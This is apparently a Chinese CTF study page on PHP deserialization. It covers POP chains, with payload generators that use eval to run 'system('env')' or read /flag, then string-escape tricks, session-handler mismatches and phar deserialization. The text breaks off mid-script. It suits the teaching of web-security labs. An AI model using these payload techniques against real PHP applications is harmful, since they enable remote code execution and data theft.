<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 先复制靶场的类定义（必须和靶场一致，否则序列化会出错）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$b</span>; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">run</span>(); &#125; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$c</span>; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">exec</span>(); &#125; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$cmd</span>; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>) </span>&#123; <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd); &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造payload的核心代码</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;cmd = <span class="string">&quot;echo file_get_contents(&#x27;/flag&#x27;);&quot;</span>; <span class="comment">// 要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成并输出payload</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;最终payload：&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="反序列化靶场-Level15-POP-链前置"><a href="#反序列化靶场-Level15-POP-链前置" class="headerlink" title="*[反序列化靶场]Level15-POP 链前置"></a>*[反序列化靶场]Level15-POP 链前置</h3><p>先进行读题,这里执行命令的函数在 destnation 中的 action(),且 $c 在最尾部</p>
<p>不难推知 class C 中的成员变量 $c 应该是我们要执行的函数</p>
<p>于是有第一行:</p>
<p>$C3 &#x3D; new C(“system(‘env’);”);括号中的代表$c 这里尝试了很多指令，只有 env 能够输出</p>
<p>$b指向$c，所以 $b 的本质应该是类 C，因此有第二行:</p>
<p>$C2 &#x3D; new B($C3);括号中的则代表$b,它在这里为类$C3</p>
<p>$a指向$b，这点同理，$a本质为类B，为$a 赋值时有第三行:</p>
<p>$C1 &#x3D; new A($C2);</p>
<p>$cmd指向$a，这里变量名叫这个，但是不能填一个指令上去，要依葫芦画瓢</p>
<p>$C5 &#x3D; new destnation($C1);</p>
<p>最后要想执行这一连串呢，需要 D 的 wakeup 被执行，从而执行 destination 指向的成员变量的 action()函数(思考是谁具有这个函数)</p>
<p>$C4 &#x3D; new D($C5);</p>
<p>最终被序列化的也是类 D，即 $C4</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">class</span> A &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">destnation</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd-&gt;a-&gt;b-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们复制题目在第一行上方，利用 php 脚本添加这五行加输出的三行，并以序列化形式输出，作为 payload 在靶场中被反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$C3</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>(<span class="string">&quot;system(&#x27;env&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$C2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>(<span class="variable">$C3</span>);</span><br><span class="line"><span class="variable">$C1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$C2</span>);</span><br><span class="line"><span class="variable">$C5</span> = <span class="keyword">new</span> <span class="title function_ invoke__">destnation</span>(<span class="variable">$C1</span>);</span><br><span class="line"><span class="variable">$C4</span> = <span class="keyword">new</span> <span class="title function_ invoke__">D</span>(<span class="variable">$C5</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$C4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;最终payload: &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Ehz0bQXm6oW3vvxLlilcvdm5nHO.png"></p>
<p><img src="/images/JAUHbBCSKoIRZ3xdzkdc06O1nmh.png"></p>
<p>所以我们可以总结一下，第一行通常是最底层的，输出 flag 的逻辑，再自深入浅构造 POP 链</p>
<p>还可以在<a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/At0RwCFKUi2Qqsk9Y0GclJY3nbc#share-M96KdrR03oxBGzxFFxzcmPWknsb">实验这一节</a>读读第 16 关的步骤</p>
<h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h2><h3 id="字符串逃逸概论"><a href="#字符串逃逸概论" class="headerlink" title="字符串逃逸概论"></a>字符串逃逸概论</h3><p>在 php 中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:7:&quot;bmjoker&quot;;i:1;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>反序列化按照一定的序列化规则，但是有一定的识别范围，在这个范围之外（花括号}之后）的字符都会被忽略，不影响反序列化的正常进行</strong>。</p>
<p>比如在 $str 结尾的花括号后增加一些字符：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a:2:&#123;i:0;s:7:&quot;bmjoker&quot;;i:1;s:4:&quot;haha&quot;;&#125;qwe123&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出的仍与原来相同</p>
<p>明白了上面的，就再看一个例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>]=<span class="string">&#x27;L2QwZzNfZmxsbGxsbGFn&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/WV8wbY11BoSWe3xD5KYcvEDbnBb.png"></p>
<p>得到的序列化字段为：</p>
<p>a:3:{s:4:”user”;s:24:”flagflagflagflagflagflag”;s:8:”function”;s:59:”a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:2:”dd”;s:1:”a”;}”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p>
<p>这里如果增加了过滤机制，会将 flag 字段替换为空，那么上面序列化字符串过滤结果为：</p>
<p>a:3{s:4:”user”;s:24:””;s:8:”function”;s:59:”a”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”;s:2:”dd”;s:1:”a”;}”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p>
<p>如果将上面过滤之后的字符串进行反序列化，会不会报错呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>]=<span class="string">&#x27;L2QwZzNfZmxsbGxsbGFn&#x27;</span>;</span><br><span class="line">ser = <span class="title function_ invoke__">serialize</span>(_SESSION);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-----------------------\n&quot;</span>;</span><br><span class="line"><span class="variable">$filter</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$ser</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$filter</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/SwVZbfOVcoIKafxqKuTcNLpjnlg.png"></p>
<p>打印出了过滤前与过滤后的反序列化字符串，对比就可以发现当把 flag 过滤之后，string(24)规定需要 24 个字符，为了满足反序列化的规则，会向后读取字符，直至凑齐 24 个字符，也就是读取”;s:8“function”;s:59:”a，当凑齐 24 个字符后以 “; 结尾。之后[“img”]就按照 string(20)读取 20 个字符，[“dd”]按照 string(1)读取一个字符，剩余的字符就直接被忽略，不影响正常的反序列化过程。</p>
<p>写成数组的形式为：</p>
<p>$_SESSION[“user”]&#x3D;’”;s:8:”function”;s:59:”a’;</p>
<p>$_SESSION[“img”]&#x3D;’ZDBnM19mMWFnLnBocA&#x3D;&#x3D;’;</p>
<p>$_SESSION[“dd”]&#x3D;’a’;</p>
<p><img src="/images/S8LKbFM7EoxffJxL8kxclpzKncc.png"></p>
<p>看完上面的例子，发现本来想读取的内容是$_SESSION[“img”]的值为：L2QwZzNfZmxsbGxsbGFn，但是由于过滤掉了flag，string(24)位数不够往后读取，就把$_SESSION[“function”]的值的前 24 位存放在$_SESSION[“user”]中，把$_SESSION[“funcion”]的值的后 20 为存放在$_SESSION[“img”]中，导致ZDBnM19mMWFnLnBocA&#x3D;&#x3D;代替了$_SESSION[“img”]对应的原本的值。而识别完成后序列化最后面的”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}被忽略掉了，不影响正常的反序列化过程。</p>
<p>即”是字符还是格式符号，是由字符串长度来判断的</p>
<p>可以看到本例中$_SESSION[“img”]对应的值发生了变化。这样的话岂不是可以做到”隔山打牛”，如果我们能够控制原来$_SESSION 数组的 funcion 的值，但无法控制 img 的值，我们就可以通过这种方式间接控制到 img 对应的值。</p>
<p><strong>所以字符串逃逸，本质上是利用过滤机制修改结构</strong></p>
<h3 id="字符串减少强化"><a href="#字符串减少强化" class="headerlink" title="字符串减少强化"></a>字符串减少强化</h3><p>假如过滤了 system()替换成空格,实例 A 的成员数被限定为了两个,我们要利用字符串逃逸新建一个成员 v3,而实例原有成员 v1v2</p>
<p>则可以使用本方式利用字符串减少来逃逸</p>
<p><img src="/images/PMGNbFb5nobCCkx8YrxcYXynnPh.png"></p>
<p>实战中我们必须思考题目中给我们真正可以修改的地方，并对其进行有效地注入</p>
<h3 id="字符串增多强化"><a href="#字符串增多强化" class="headerlink" title="字符串增多强化"></a>字符串增多强化</h3><p>假如 ls 替换成了 pwd,我们可以利用</p>
<p><img src="/images/M7Zkb43vroU4sxxTwLUcIgt9nqe.png"></p>
<p><img src="/images/YR2TbSfgsoSOkMx9QQFckxbGn4f.png"></p>
<p>笼统点理解，就是字符串增多是利用增多提前结束，真正执行的是第一个大括号内部的，外部为迎合格式；</p>
<p>字符串减少是利用减少延迟结束，真正执行的是第一个大括号外部的，内部为迎合格式</p>
<p>对于字符串增多 我们举一个例子:</p>
<h3 id="SQCTF-逃"><a href="#SQCTF-逃" class="headerlink" title="*[SQCTF]逃"></a>*[SQCTF]逃</h3><p>阅读源码，这里要先创建一个序列化字符串，经过过滤，将字符串 flag&#x2F;php 转化成 stop 再进行反序列化创建对象</p>
<p>并且要求变量 pswd 的值是 escaping,这很明显是字符串增多</p>
<p><img src="/images/Uyl9bJOGFodlCYxvx9vcKIT1ndb.png"></p>
<p>也就是说我们真正想要添加的元素是:</p>
<p>s:4:”pswd”;s:8:”escaping”;</p>
<p>那么大致的框架已经出来了:</p>
<p>(其中倒数第一个大括号至倒数第二个大括号只是迎合反序列化的格式，并不是我们真正想要执行的代码)</p>
<p>O:4:”test”:2:{s:4:”user”;s:n*3+29:”n 个 php”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}</p>
<p>29 则指的是**[<strong>“;s:4:”pswd”;s:8:”escaping”;}</strong>]的字符串长度**</p>
<p>我们将过滤的过程动态化，就能明白字符串是如何增多的:</p>
<p>如果我们输入一个 php,user 的长度本应该是 3 个字符</p>
<p>过滤前:</p>
<p>O:4:”test”:2:{s:4:”user”;s:31:”php”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}</p>
<p>过滤后:</p>
<p>O:4:”test”:2:{s:4:”user”;s:31:”stop”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}</p>
<p>过滤后仍取 31 个字符，只取到绿底大括号的前一个，我们就称这个绿底大括号”逃逸了”</p>
<p>我们继续增加字符串 php 的个数</p>
<p>过滤前:</p>
<p>O:4:”test”:2:{s:4:”user”;s:34:”phpphp”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}</p>
<p>过滤后:</p>
<p>O:4:”test”:2:{s:4:”user”;s:34:”stopstop”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}<br>是不是发现了一个问题,我们每多放进去一个 php，就会有一个字符用 s:34 取不到，如果”n*3+29”在过滤后恰好取到了紫标的双引号之前呢?那第一个大括号之前的字符串不再是引用，而是可以运行的代码了</p>
<p>我们再来看看正确答案:</p>
<p>{s:4:”user”;s:116:”phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}</p>
<p>实际上黄底加橙底，一共是 116 个字符，初始的序列化必然是合法的</p>
<p>php 全变成 flag 后</p>
<p>{s:4:”user”;s:116:”flag*29”;s:4:”pswd”;s:8:”escaping”;}”;s:4:”pswd”;s:8:”escaping”;}</p>
<p>s:116 恰好是取到了最后一个 flag，不包括最后一个 flag 后面的双引号 “;s:4:”pswd”;s:8:”escaping”;} 这 29 个字符直接逃逸出来了，从而组成了一个新的合法格式</p>
<p><img src="/images/Cyswbckcgo2OElx3cItcqaAYn5g.png"></p>
<h2 id="Session-反序列化"><a href="#Session-反序列化" class="headerlink" title="Session 反序列化"></a>Session 反序列化</h2><p>当 session_start()被调用或者 php.ini 中 session.auto_start 为 1 时</p>
<p>PHP 代码中的 $_SESSION 可以将变量以特定格式存储到指定目录（默认为&#x2F;tmp）。</p>
<p>而特定格式与处理器有关，这里着重记前两个</p>
<p><img src="/images/CVMhbVf5holiOGxr3Gkcn36UnLh.png"></p>
<p>php 处理器:</p>
<p><img src="/images/UMRGb3tMjose6ExTQeYcwAOOngc.png"></p>
<p>注意到有 session_start()函数和 $session</p>
<p>我们尝试 get: ?ben&#x3D;123456</p>
<p>读取特定的文件</p>
<p>则发现变量 ben 就被存储了</p>
<p><img src="/images/Lm0jbSPivoVJWAxLziBc6iNWnXe.png"></p>
<p>php_serialize 处理器:</p>
<p>声明 session 存储格式为 php_serialize,若未声明则默认为上面的 php</p>
<p><img src="/images/ZaIHb6Rghoa0i9xcJqXcgNIEnTd.png"></p>
<p>尝试 payload:</p>
<p><img src="/images/IRAobfMiBo5eJ0xZ7lbcM3Ranme.png"></p>
<p>文件中则会出现序列化后的数组</p>
<p><img src="/images/K2ypb9ndAoBnicx3PrXc6sYtnAI.png"></p>
<p>而当网站序列化并<strong>存储($_session&#x3D;$_get)</strong>，与反序列化并**读取($_get&#x3D;$_session)**Session 的方式不同，就可能导致 session 反序列化漏洞的产生。</p>
<p><img src="/images/OXhabK5zVoEQq3xAynqc8aAOnde.png"></p>
<p>当一个 php 页面以 php_serialize 方式写入(存储)，用 php 方式读取时</p>
<p>如果提交</p>
<p><img src="/images/L93Obcn3To6b1tx2G2xc3XWEnhc.png"></p>
<p>则存储时是这样:</p>
<p><img src="/images/C9yRbdoVvoZ2lyxJtqecGFNlnwt.png"></p>
<p>用 php 形式读取后，就只有管道控制符 | 后面的内容了，是某一个对象的实例.</p>
<p>因此 php_serialize 形式提交，无论如何只会返回一个数组的序列化形式，但如果读取方式是 php，可以利用返回的数组中存在的管道控制符 | 初始化实例或者基本类型变量</p>
<p>注意:</p>
<p>$_session&#x3D;$_get 存储后如果要执行 wakeup 等读取的函数则自动用$_get&#x3D;$_session 读取</p>
<h2 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar 反序列化"></a>phar 反序列化</h2><h3 id="什么是-phar"><a href="#什么是-phar" class="headerlink" title="什么是 phar"></a>什么是 phar</h3><p>JAR 是开发 Java 程序一个应用，包括所有的可执行、可访问的文件，都打包进了一个 JAR 文件里</p>
<p>使得部署过程十分简单。</p>
<p>PHAR(“PhpARchive”)是 PHP 里<strong>类似于 JAR</strong> 的一种打包文件。</p>
<p>对于 PHP5.3 或更高版本，Phar 后缀文件是<strong>默认开启支持</strong>的，可以直接使用它。</p>
<h3 id="Phar-结构"><a href="#Phar-结构" class="headerlink" title="Phar 结构"></a>Phar 结构</h3><p>stub phar 文件标识，格式为 xxx<?phpxxx;__HALT_COMPiLER();?>;(头部信息）</p>
<p>manifest 压缩文件的属性等信息，以序列化存储；</p>
<p>contents 压缩文件的内容；</p>
<p>signature 签名，放在文件末尾；</p>
<h3 id="phar-漏洞原理"><a href="#phar-漏洞原理" class="headerlink" title="phar 漏洞原理"></a>phar 漏洞原理</h3><p>manifest 压缩文件的属性等信息，以序列化存储；存在一段序列化的字符串；</p>
<p>调用 phar 伪协议，可读取.phar 文件；</p>
<p><strong>Phar 协议解析文件时，会自动触发对 manifest 字段的序列化字符串进行反序列化</strong></p>
<p>而我们也可以修改 manifest 属性</p>
<p><em>注:Phar 需要 PHP &gt;&#x3D;5.2 在 php.ini 中将 phar.readonly 设为 Off</em></p>
<h3 id="Phar-使用条件"><a href="#Phar-使用条件" class="headerlink" title="Phar 使用条件"></a>Phar 使用条件</h3><p>phar 文件能上传到服务器端；</p>
<p>phar:&#x2F;&#x2F;接的文件无论是不是.phar，都会按 phar 读取</p>
<p>要有可用反序列化魔术方法作为跳板；</p>
<p>要有文件操作函数，如 file_exists()，fopen()，file_get_contents(）来解析文件;</p>
<p>文件操作函数参数可控，且：、&#x2F;、phar 等特殊字符没有被过滤.</p>
<p><img src="/images/SIkCbdL82oJ0RFx25sZcHP89nac.png"></p>
<h3 id="构造有序列化的-phar-文件"><a href="#构造有序列化的-phar-文件" class="headerlink" title="构造有序列化的 phar 文件"></a>构造有序列化的 phar 文件</h3><p>本地生成一个 phar 文件，要想使用 Phar 类里的方法，必须将 php.ini 文件中的 phar.readonly 配置项配置为 0 或 Off</p>
<p><img src="/images/LcgIb1bo9oOQ8Fx0vJ9cguZanwb.png"></p>
<p>PHP 内置 phar 类，其中的一些方法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例一个phar对象供后续操作</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;joker.phar&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">//开始缓冲Phar写操作 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//以字符串的形式添加一个文件到 phar 档案 </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;&lt;?php echo &#x27;</span>this is test file<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">//把一个fileTophar目录下的文件归档到phar档案</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">buildFromDirectory</span>(<span class="string">&#x27;fileTophar&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数解压一个phar包，extractTo()提取phar文档内容</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">extractTo</span>()</span><br></pre></td></tr></table></figure>

<p>生成 phar 文件的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//反序列化payload构造class TestObject &#123;</span></span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例一个phar对象供后续操作，后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line">    <span class="comment">//开始缓冲对phar的写操作 </span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">//将反序列化的对象放入该文件中</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span>-&gt;data=<span 